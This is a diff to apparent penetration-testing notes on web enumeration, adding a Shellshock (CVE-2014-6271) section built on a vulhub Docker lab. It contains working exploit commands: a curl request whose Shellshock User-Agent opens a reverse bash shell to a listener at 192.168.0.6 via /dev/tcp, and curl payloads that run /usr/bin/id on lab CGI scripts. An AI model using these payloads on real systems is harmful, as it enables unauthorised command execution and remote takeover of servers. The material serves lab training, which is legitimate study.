@@ -340,3 +340,19 @@ Web enumeration means to look out info about services running on port, versions,
 	# nc -nlvp 4455
 		
 	# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ;/bin/bash -i >& /dev/tcp/192.168.0.6/4455 0>&1" http://192.168.0.106/cgi-bin/test/test.cgi
+## Shellshock Remote Command Injection (CVE-2014-6271)
+	http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+		
+	https://github.com/vulhub/vulhub/blob/master/bash/shellshock/README.md
+		
+	# cd /root/vulhub/bash/shellshock
+		
+	# docker-compose build
+		
+	# docker-compose up -d
+		
+	# netstat -nltup
+
+	# curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.0.104:8080/victim.cgi
+		
+	# curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.0.104:8080/safe.cgi
